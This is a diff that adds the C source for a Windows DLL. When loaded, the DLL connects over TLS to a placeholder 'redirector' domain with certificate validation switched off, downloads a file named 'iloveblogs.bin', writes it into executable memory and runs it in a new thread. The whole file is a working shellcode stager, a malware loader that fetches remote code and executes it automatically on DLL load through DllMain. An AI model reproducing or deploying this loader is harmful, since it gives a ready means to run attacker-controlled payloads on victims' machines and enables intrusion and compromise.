@@ -1,0 +1,323 @@
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <windows.h>
+#define SECURITY_WIN32
+#include <sspi.h>
+#include <schannel.h>
+#include <stdio.h>
+
+#pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "secur32.lib")
+
+#define DEFAULT_BUFLEN 4096
+
+// Update these to match your setup
+char ip[] = "www.<redirector-domain>";  // e.g., "www.example.com"
+char port[] = "443";
+char resource[] = "iloveblogs.bin";
+
+void getShellcode_Run(char* host, char* port, char* resource) {
+    WSADATA wsaData;
+    SOCKET ConnectSocket = INVALID_SOCKET;
+    struct addrinfo *result = NULL, *ptr = NULL, hints;
+    char sendbuf[MAX_PATH] = "";
+    char recvbuf[DEFAULT_BUFLEN];
+    char sslBuf[16384];
+    char *encryptedBuf = NULL;
+    int iResult;
+    int sslBufLen = 0;
+    CredHandle hCred;
+    CtxtHandle hContext;
+    SECURITY_STATUS secStatus;
+    SecBuffer bufs[4] = {0};
+    SecBufferDesc message = {0};
+    char fullResponse[65536] = {0};
+    int fullResponseLen = 0;
+
+    // Build proper HTTP request
+    sprintf_s(sendbuf, MAX_PATH, "GET /%s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", resource, host);
+    OutputDebugStringA("HTTP Request: ");
+    OutputDebugStringA(sendbuf);
+
+    // Initialize Winsock
+    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
+    if (iResult != 0) {
+        OutputDebugStringA("WSAStartup failed\n");
+        return;
+    }
+
+    ZeroMemory(&hints, sizeof(hints));
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+
+    // Resolve the server address and port
+    iResult = getaddrinfo(host, port, &hints, &result);
+    if (iResult != 0) {
+        OutputDebugStringA("getaddrinfo failed\n");
+        WSACleanup();
+        return;
+    }
+
+    // Create socket
+    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
+        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
+        if (ConnectSocket == INVALID_SOCKET) {
+            OutputDebugStringA("socket failed\n");
+            WSACleanup();
+            return;
+        }
+
+        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
+        if (iResult == SOCKET_ERROR) {
+            closesocket(ConnectSocket);
+            ConnectSocket = INVALID_SOCKET;
+            continue;
+        }
+        break;
+    }
+    freeaddrinfo(result);
+
+    if (ConnectSocket == INVALID_SOCKET) {
+        OutputDebugStringA("Unable to connect\n");
+        WSACleanup();
+        return;
+    }
+
+    // Initialize SSL
+    SCHANNEL_CRED schannelCred = {0};
+    schannelCred.dwVersion = SCHANNEL_CRED_VERSION;
+    schannelCred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT;
+    schannelCred.dwFlags = SCH_CRED_NO_DEFAULT_CREDS | SCH_CRED_MANUAL_CRED_VALIDATION;
+
+    secStatus = AcquireCredentialsHandleA(NULL, (LPSTR)UNISP_NAME_A, SECPKG_CRED_OUTBOUND, NULL, &schannelCred, NULL, NULL, &hCred, NULL);
+    if (secStatus != SEC_E_OK) {
+        char errorMsg[256];
+        sprintf_s(errorMsg, 256, "AcquireCredentialsHandle failed: 0x%08X\n", secStatus);
+        OutputDebugStringA(errorMsg);
+        closesocket(ConnectSocket);
+        WSACleanup();
+        return;
+    }
+
+    // Perform SSL handshake
+    SecBufferDesc outBuffer, inBuffer;
+    SecBuffer outBuffers[1], inBuffers[2];
+    DWORD dwFlags = ISC_REQ_SEQUENCE_DETECT | ISC_REQ_REPLAY_DETECT | ISC_REQ_CONFIDENTIALITY |
+                    ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_STREAM;
+
+    outBuffers[0].pvBuffer = NULL;
+    outBuffers[0].BufferType = SECBUFFER_TOKEN;
+    outBuffers[0].cbBuffer = 0;
+    outBuffer.cBuffers = 1;
+    outBuffer.pBuffers = outBuffers;
+    outBuffer.ulVersion = SECBUFFER_VERSION;
+
+    secStatus = InitializeSecurityContextA(&hCred, NULL, host, dwFlags, 0, 0, NULL, 0, &hContext, &outBuffer, &dwFlags, NULL);
+    if (secStatus != SEC_I_CONTINUE_NEEDED) {
+        char errorMsg[256];
+        sprintf_s(errorMsg, 256, "InitializeSecurityContext failed: 0x%08X\n", secStatus);
+        OutputDebugStringA(errorMsg);
+        goto Cleanup;
+    }
+
+    iResult = send(ConnectSocket, (char*)outBuffers[0].pvBuffer, outBuffers[0].cbBuffer, 0);
+    if (iResult == SOCKET_ERROR) {
+        OutputDebugStringA("SSL handshake send failed\n");
+        goto Cleanup;
+    }
+    FreeContextBuffer(outBuffers[0].pvBuffer);
+
+    // Receive handshake response
+    do {
+        iResult = recv(ConnectSocket, sslBuf + sslBufLen, sizeof(sslBuf) - sslBufLen, 0);
+        if (iResult <= 0) {
+            OutputDebugStringA("SSL handshake recv failed\n");
+            goto Cleanup;
+        }
+        sslBufLen += iResult;
+
+        inBuffers[0].pvBuffer = sslBuf;
+        inBuffers[0].cbBuffer = sslBufLen;
+        inBuffers[0].BufferType = SECBUFFER_TOKEN;
+        inBuffers[1].pvBuffer = NULL;
+        inBuffers[1].cbBuffer = 0;
+        inBuffers[1].BufferType = SECBUFFER_EMPTY;
+        inBuffer.cBuffers = 2;
+        inBuffer.pBuffers = inBuffers;
+        inBuffer.ulVersion = SECBUFFER_VERSION;
+
+        outBuffers[0].pvBuffer = NULL;
+        outBuffers[0].cbBuffer = 0;
+        outBuffers[0].BufferType = SECBUFFER_TOKEN;
+
+        secStatus = InitializeSecurityContextA(&hCred, &hContext, NULL, dwFlags, 0, 0, &inBuffer, 0, NULL, &outBuffer, &dwFlags, NULL);
+        if (secStatus == SEC_E_OK || secStatus == SEC_I_CONTINUE_NEEDED) {
+            if (outBuffers[0].pvBuffer) {
+                iResult = send(ConnectSocket, (char*)outBuffers[0].pvBuffer, outBuffers[0].cbBuffer, 0);
+                FreeContextBuffer(outBuffers[0].pvBuffer);
+                if (iResult == SOCKET_ERROR) {
+                    OutputDebugStringA("SSL handshake continuation failed\n");
+                    goto Cleanup;
+                }
+            }
+            sslBufLen = 0;  // Reset buffer for next iteration
+        }
+    } while (secStatus == SEC_I_CONTINUE_NEEDED);
+
+    if (secStatus != SEC_E_OK) {
+        char errorMsg[256];
+        sprintf_s(errorMsg, 256, "SSL handshake failed: 0x%08X\n", secStatus);
+        OutputDebugStringA(errorMsg);
+        goto Cleanup;
+    }
+
+    // Encrypt and send the HTTP request
+    SecPkgContext_StreamSizes sizes;
+    secStatus = QueryContextAttributesA(&hContext, SECPKG_ATTR_STREAM_SIZES, &sizes);
+    if (secStatus != SEC_E_OK) {
+        char errorMsg[256];
+        sprintf_s(errorMsg, 256, "QueryContextAttributes failed: 0x%08X\n", secStatus);
+        OutputDebugStringA(errorMsg);
+        goto Cleanup;
+    }
+
+    // Allocate buffer for header, data, and trailer
+    encryptedBuf = (char*)malloc(sizes.cbHeader + sizes.cbMaximumMessage + sizes.cbTrailer);
+    if (!encryptedBuf) {
+        OutputDebugStringA("malloc failed\n");
+        goto Cleanup;
+    }
+
+    // Set up the buffers for encryption
+    bufs[0].BufferType = SECBUFFER_STREAM_HEADER;
+    bufs[0].cbBuffer = sizes.cbHeader;
+    bufs[0].pvBuffer = encryptedBuf;
+
+    bufs[1].BufferType = SECBUFFER_DATA;
+    bufs[1].cbBuffer = strlen(sendbuf);
+    bufs[1].pvBuffer = encryptedBuf + sizes.cbHeader;
+    memcpy(bufs[1].pvBuffer, sendbuf, bufs[1].cbBuffer);
+
+    bufs[2].BufferType = SECBUFFER_STREAM_TRAILER;
+    bufs[2].cbBuffer = sizes.cbTrailer;
+    bufs[2].pvBuffer = encryptedBuf + sizes.cbHeader + bufs[1].cbBuffer;
+
+    bufs[3].BufferType = SECBUFFER_EMPTY;
+    bufs[3].cbBuffer = 0;
+    bufs[3].pvBuffer = NULL;
+
+    message.ulVersion = SECBUFFER_VERSION;
+    message.cBuffers = 4;
+    message.pBuffers = bufs;
+
+    secStatus = EncryptMessage(&hContext, 0, &message, 0);
+    if (secStatus != SEC_E_OK) {
+        char errorMsg[256];
+        sprintf_s(errorMsg, 256, "EncryptMessage failed: 0x%08X\n", secStatus);
+        OutputDebugStringA(errorMsg);
+        goto Cleanup;
+    }
+
+    // Send the encrypted data (header + data + trailer)
+    int totalSize = bufs[0].cbBuffer + bufs[1].cbBuffer + bufs[2].cbBuffer;
+    iResult = send(ConnectSocket, encryptedBuf, totalSize, 0);
+    if (iResult == SOCKET_ERROR) {
+        OutputDebugStringA("send failed\n");
+        goto Cleanup;
+    }
+
+    // Receive and decrypt the response
+    sslBufLen = 0;
+    do {
+        iResult = recv(ConnectSocket, sslBuf + sslBufLen, sizeof(sslBuf) - sslBufLen, 0);
+        if (iResult > 0) {
+            sslBufLen += iResult;
+            inBuffers[0].pvBuffer = sslBuf;
+            inBuffers[0].cbBuffer = sslBufLen;
+            inBuffers[0].BufferType = SECBUFFER_DATA;
+            inBuffers[1].BufferType = SECBUFFER_EMPTY;
+            inBuffer.cBuffers = 2;
+            inBuffer.pBuffers = inBuffers;
+
+            secStatus = DecryptMessage(&hContext, &inBuffer, 0, NULL);
+            if (secStatus == SEC_E_OK) {
+                int decryptedLen = inBuffers[1].cbBuffer;
+                if (fullResponseLen + decryptedLen < sizeof(fullResponse)) {
+                    memcpy(fullResponse + fullResponseLen, inBuffers[1].pvBuffer, decryptedLen);
+                    fullResponseLen += decryptedLen;
+                }
+                sslBufLen = 0;
+            } else if (secStatus == SEC_E_INCOMPLETE_MESSAGE) {
+                continue;
+            } else {
+                char errorMsg[256];
+                sprintf_s(errorMsg, 256, "DecryptMessage failed: 0x%08X\n", secStatus);
+                OutputDebugStringA(errorMsg);
+                break;
+            }
+        } else if (iResult == 0) {
+            OutputDebugStringA("Connection closed\n");
+            break;
+        } else {
+            OutputDebugStringA("recv failed\n");
+            break;
+        }
+    } while (true);
+
+    // Parse the HTTP response to extract the payload
+    if (fullResponseLen > 0) {
+        fullResponse[fullResponseLen] = '\0';
+        OutputDebugStringA("Full Response: ");
+        OutputDebugStringA(fullResponse);
+
+        char* payloadStart = strstr(fullResponse, "\r\n\r\n");
+        if (payloadStart) {
+            payloadStart += 4;
+            int payloadSize = fullResponseLen - (payloadStart - fullResponse);
+
+            if (payloadSize > 0) {
+                if (payloadSize <= DEFAULT_BUFLEN) {
+                    memcpy(recvbuf, payloadStart, payloadSize);
+
+                    PVOID remoteBuffer = VirtualAlloc(NULL, (SIZE_T)payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                    if (remoteBuffer) {
+                        memcpy(remoteBuffer, recvbuf, payloadSize);
+                        HANDLE remoteThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
+                        if (remoteThread) {
+                            WaitForSingleObject(remoteThread, INFINITE);
+                            CloseHandle(remoteThread);
+                        }
+                        VirtualFree(remoteBuffer, 0, MEM_RELEASE);
+                    } else {
+                        OutputDebugStringA("VirtualAlloc failed\n");
+                    }
+                } else {
+                    OutputDebugStringA("Payload too large for recvbuf\n");
+                }
+            } else {
+                OutputDebugStringA("No payload data after headers\n");
+            }
+        } else {
+            OutputDebugStringA("Failed to find end of HTTP headers\n");
+        }
+    } else {
+        OutputDebugStringA("No data received\n");
+    }
+
+Cleanup:
+    if (encryptedBuf) free(encryptedBuf);
+    DeleteSecurityContext(&hContext);
+    FreeCredentialsHandle(&hCred);
+    closesocket(ConnectSocket);
+    WSACleanup();
+}
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
+    switch (fdwReason) {
+    case DLL_PROCESS_ATTACH:
+        getShellcode_Run(ip, port, resource);
+        break;
+    }
+    return TRUE;
+}
